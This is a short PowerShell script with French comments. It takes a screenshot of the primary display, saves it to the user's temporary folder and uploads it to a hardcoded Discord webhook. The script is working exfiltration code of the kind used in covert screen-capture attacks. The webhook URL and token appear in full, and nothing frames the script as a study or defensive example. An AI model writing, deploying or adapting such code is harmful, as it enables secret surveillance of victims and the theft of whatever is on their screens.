# Définir l'URL du webhook Discord
https://discord.com/api/webhooks/1151525024088477868/uRlaL-EA8gyLBxmjfzoZg5aAB1QT24phwo9XA13_rA2tai3rMHp2E7KqZEKN9sMS54kF

# Définir le chemin d'accès complet pour enregistrer la capture d'écran dans le répertoire temporaire de l'utilisateur
$fileName = "$env:TEMP\screenshot.png"

# Prendre une capture d'écran
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screenshot = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screenshot.Width, $screenshot.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screenshot.Location, [System.Drawing.Point]::Empty, $screenshot.Size)

# Vérifier si la capture d'écran est réussie
if (-not $bitmap.GetPixel(0, 0).IsEmpty) {
    # Enregistrer la capture d'écran dans le répertoire temporaire
    $bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)

    # Envoyer la capture d'écran au webhook Discord
    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1151525024088477868/uRlaL-EA8gyLBxmjfzoZg5aAB1QT24phwo9XA13_rA2tai3rMHp2E7KqZEKN9sMS54kF" -Method Post -InFile $fileName -ContentType "multipart/form-data"
} else {
    Write-Host "La capture d'écran a échoué."
}
